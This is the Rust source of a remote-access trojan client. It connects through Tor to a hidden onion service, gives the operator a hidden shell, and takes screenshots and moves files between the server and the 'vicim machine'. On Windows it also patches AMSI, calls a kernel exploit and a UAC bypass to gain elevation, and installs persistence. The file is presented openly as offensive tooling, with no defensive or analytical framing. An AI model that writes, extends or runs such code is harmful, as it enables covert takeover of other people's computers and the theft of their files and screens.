#[cfg(target_os = "windows")]
mod uac_bypass;
#[cfg(target_os = "windows")]
mod amsi_patch;
#[cfg(target_os = "windows")]
mod kernel_exploit;
#[cfg(target_os = "windows")]
mod persist;
#[cfg(target_os = "windows")]
use is_elevated::is_elevated;


use arti_client::{TorClient, TorClientConfig, DataStream};
#[cfg(target_os = "windows")]
use libc::malloc;
use tor_rtcompat::PreferredRuntime;
use tokio::io::split;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::process::Command;
use anyhow::{Result, anyhow};
use gethostname::gethostname;
use tokio::time::{sleep, Duration};
#[cfg(target_os = "windows")]
use zstd::zstd_safe::OutBuffer;
//#[cfg(target_os = "linux")]
//use core::ffi::c_str::Bytes;
use core::task;
use std::{fs,env};
use std::path::{Path};
use base64::{engine::general_purpose, Engine as _};
use libc::{c_int};

#[cfg(target_os = "windows")]
use screenshots::{Screen};
#[cfg(target_os = "macos")]
use screenshots::{Screen};
#[cfg(target_os = "linux")]
use screenshots::{Screen};

#[cfg(target_os = "windows")]
use screenshots::image::ImageOutputFormat;
#[cfg(target_os = "macos")]
use screenshots::image::ImageOutputFormat;
#[cfg(target_os = "linux")]
use screenshots::image::ImageOutputFormat;





#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

const CONFIG_HOSTNAME: &[u8] = include_bytes!("../config/hostname");

fn get_onion_host() -> String {
    String::from_utf8_lossy(CONFIG_HOSTNAME).trim().to_string()
}


#[derive(Clone, Debug)]
pub struct ClientConfig {
    pub onion: String,
    pub port: u16,
}


impl Default for ClientConfig {
    fn default() -> Self {
        Self {
            onion: get_onion_host(),
            port: 1337,
        }
    }
}
/// Initialize Tor client
async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
    let config = TorClientConfig::default();
    let client = TorClient::create_bootstrapped(config).await?;
    println!("Initialized Tor Client");
    Ok(client)
}

#[cfg(not(target_os = "android"))]
fn take_screenshot_base64() -> anyhow::Result<String> {
    let screens = Screen::all()?;
    let screen = &screens[0];

    // Capture screenshot
    let image = screen.capture()?;

    // Encode PNG into memory
    let mut png_bytes: Vec<u8> = Vec::new();

    image.write_to(
        &mut std::io::Cursor::new(&mut png_bytes),
        ImageOutputFormat::Png,
    )?;

    // Convert PNG bytes -> base64
    let b64 = general_purpose::STANDARD.encode(&png_bytes);
    Ok(format!("{}",b64))
}

#[cfg(target_os = "android")]
pub fn take_screenshot_base64() -> anyhow::Result<String> {
    use anyhow::{anyhow, Result};
    use base64::{engine::general_purpose, Engine as _};
    use std::fs;
    use std::path::Path;
    use std::process::Command;

    // Temporary screenshot path
    let screenshot_path = "/data/local/tmp/screenshot.png";

    // Run Android screencap utility
    let output = Command::new("/system/bin/screencap")
        .arg("-p")
        .arg(screenshot_path)
        .output()?;

    // Ensure screencap succeeded
    if !output.status.success() {
        return Err(anyhow!(
            "screencap failed: {}",
            String::from_utf8_lossy(&output.stderr)
        ));
    }

    let path = Path::new(screenshot_path);

    // Read PNG bytes
    let png_bytes = fs::read(path)?;

    // Remove temporary screenshot file
    fs::remove_file(path)?;

    // Encode PNG bytes as base64
    let encoded = general_purpose::STANDARD.encode(&png_bytes);

    Ok(encoded)
}

/// Build prompt string
pub fn build_prompt() -> String {
    let user = std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "unknown".into());

    let host = gethostname()
        .into_string()
        .unwrap_or_else(|_| "host".into());

    let cwd = std::env::current_dir()
        .map(|p| p.display().to_string())
        .unwrap_or_else(|_| "?".into());

    format!("{}@{} [{}] >> ", user, host, cwd)
}


/// Execute a command
pub async fn run_command(input: &str) -> Result<Vec<u8>> {
    let mut parts = input.trim().split_whitespace();

    let cmd = parts.next().ok_or_else(|| anyhow!("Empty command"))?;
    let args: Vec<&str> = parts.collect();

    match cmd {
        "help" | "/h"|"/?" |"" => {
            Ok(format!("

Available commands:
    `cd [directory]`=>\t Change Directory to [directory]
    `screenshot`=>\tTake screenshot from vicim machine
    `upload [filename]`=>\tUpload file to the server
    `download [filename]`=>\tDownload file from the server
    `uac [exe_path]`=>\tRun elevated command on Windows

    ").into_bytes())
        }
        "screenshot" => {
            let filename = args
                .get(0)
                .ok_or_else(|| anyhow!("Missing filename"))?;

            if filename == &""{
                let encoded = take_screenshot_base64()?;
                Ok(format!("[file] screenshot.png {}", encoded).into_bytes())
            }else{
                let encoded = take_screenshot_base64()?;
                Ok(format!("[file] {} {}",filename, encoded).into_bytes())
            }
        }
        "upload" => {
            let input_filename = args
                .get(0)
                .ok_or_else(|| anyhow!("upload: missing filename"))?;

            let path = Path::new(input_filename);

            let data = fs::read(path)?;

            let filename = path
                .file_name()
                .and_then(|f| f.to_str())
                .ok_or_else(|| anyhow!("invalid filename"))?;
            let encoded = general_purpose::STANDARD.encode(&data);
            Ok(format!(
                "[file] {} {}",
                filename,
                encoded
            )
            .into_bytes())
        }
        "download" | "[file][" => {
            
            let input_filename = args
                .get(0)
                .ok_or_else(|| anyhow!("download: missing filename"))?;

            let encoded = args
                .get(1)
                .ok_or_else(|| anyhow!("download: missing data"))?;

            let data = general_purpose::STANDARD.decode(encoded)?;

            let path = Path::new(input_filename);

            fs::write(path, &data)?;

            Ok(format!("Wrote data to {}", input_filename).into_bytes())
        }
        "cd" => {
            let target = args.get(0).ok_or_else(|| anyhow!("cd: missing argument"))?;

            match std::env::set_current_dir(target) {
                Ok(_) => {
                    let cwd = std::env::current_dir()?;
                    Ok(format!("Changed directory to {}\n", cwd.display()).into_bytes())
                }
                Err(e) => {
                    Ok(format!("cd error: {}\n", e).into_bytes())
                }
            }
        }
        "uac" => {
            #[cfg(target_os = "windows")]
            {
                if args.is_empty() {
                    return Ok(b"uac: missing argument\n".to_vec());
                }

                let payload = args.join(" ");
                crate::uac_bypass::elevate_uac(&payload);

                Ok(format!("Triggered UAC with payload: {}\n", payload).into_bytes())
            }

            #[cfg(not(target_os = "windows"))]
            {
                Ok(b"uac not supported on this OS\n".to_vec())
            }
        }

        "exit" | "quit" | "/quit" => {
            std::process::exit(0);
        }

        _ => {
            #[cfg(target_os = "windows")]
            let mut command = {
                let mut c = Command::new("cmd.exe");
                c.arg("/C")
                    .arg(input)
                    .creation_flags(CREATE_NO_WINDOW);
                c
            };

            #[cfg(target_os = "linux")]
            let mut command = {
                let mut c = Command::new("/bin/sh");
                c.arg("-c").arg(input);
                c
            };
            #[cfg(target_os = "macos")]
            let mut command = {
                let mut c = Command::new("/bin/sh");
                c.arg("-c").arg(input);
                c
            };
            #[cfg(target_os = "android")]
            let mut command = {
                let mut c = Command::new("/system/bin/sh");
                c.arg("-c").arg(input);
                c
            };



            let output = command.output().await?;

            let mut result = Vec::new();
            result.extend_from_slice(&output.stdout);
            result.extend_from_slice(&output.stderr);

            if result.is_empty() {
                result.extend_from_slice(b"(no output)\n");
            }

            if !result.ends_with(b"\n") {
                result.push(b'\n');
            }

            Ok(result)
        }
    }
}

/// Connect to onion service
pub async fn connect_onion(
    tor_client: &TorClient<PreferredRuntime>,
    onion_addr: &str,
    port: u16,
) -> Result<DataStream> {
    Ok(tor_client.connect((onion_addr, port)).await?)
}

/// Session loop
pub async fn read_loop(stream: DataStream) -> Result<()> {
    let (mut reader, mut writer) = split(stream);

    let mut buf = [0u8; 16384];
    let mut buffer = String::new();

    writer.write_all(build_prompt().as_bytes()).await?;
    writer.flush().await?;

    loop {
        let n = reader.read(&mut buf).await?;

        if n == 0 {
            println!("Connection closed by remote");
            break;
        }

        buffer.push_str(&String::from_utf8_lossy(&buf[..n]));

        while let Some(pos) = buffer.find('\n') {
            let mut line = buffer[..pos].to_string();
            buffer.drain(..=pos);

            line = line.trim().to_string();

            if line.is_empty() {
                writer.write_all(build_prompt().as_bytes()).await?;
                writer.flush().await?;
                continue;
            }

            let output = run_command(&line).await?;
            writer.write_all(&output).await?;

            writer.write_all(build_prompt().as_bytes()).await?;
            writer.flush().await?;
        }
    }

    Ok(())
}

/// Core runner
pub async fn netclient_run(config: ClientConfig) -> Result<()> {
    loop {
        println!("Attempting to connect...");

        let tor_client = init_tor().await?;

        match connect_onion(&tor_client, &config.onion, config.port).await {
            Ok(stream) => {
                println!("Connected to onion service");

                if let Err(e) = read_loop(stream).await {
                    println!("Session error: {}", e);
                }

                println!("Connection closed, will reconnect...");
            }
            Err(e) => {
                println!("Connection failed: {}", e);
            }
        }
        //let mut rng = thread_rng();
        let delay = 17;
        println!("Reconnecting in {} seconds...", delay);
        sleep(Duration::from_secs(delay)).await;
    }
}

#[cfg(target_os = "windows")]
const IS_DLL:bool = true;

#[unsafe(export_name = "netclient")]
pub async extern "C" fn netclient()->  c_int {
    #[cfg(target_os = "windows")]
    amsi_patch::amsi_patch();

    #[cfg(target_os = "windows")]
    let exe_path = match std::env::current_exe() {
        Ok(p) => p,
        Err(_) => return 1,
    };


    #[cfg(target_os = "windows")]
    let exe_str = exe_path.to_string_lossy().to_string();

    #[cfg(target_os = "windows")]
    if !is_elevated() {
        unsafe {
            kernel_exploit::exploit();
        }
        uac_bypass::elevate_uac(&exe_str);
        return 1;
    } 
    #[cfg(target_os = "windows")]
    persist::persist(IS_DLL);
    #[cfg(target_os = "windows")]
    if !is_elevated(){
        sleep(Duration::from_secs(61)).await;
    }
    let _ = netclient_run(ClientConfig::default()).await;
    return 0;
}
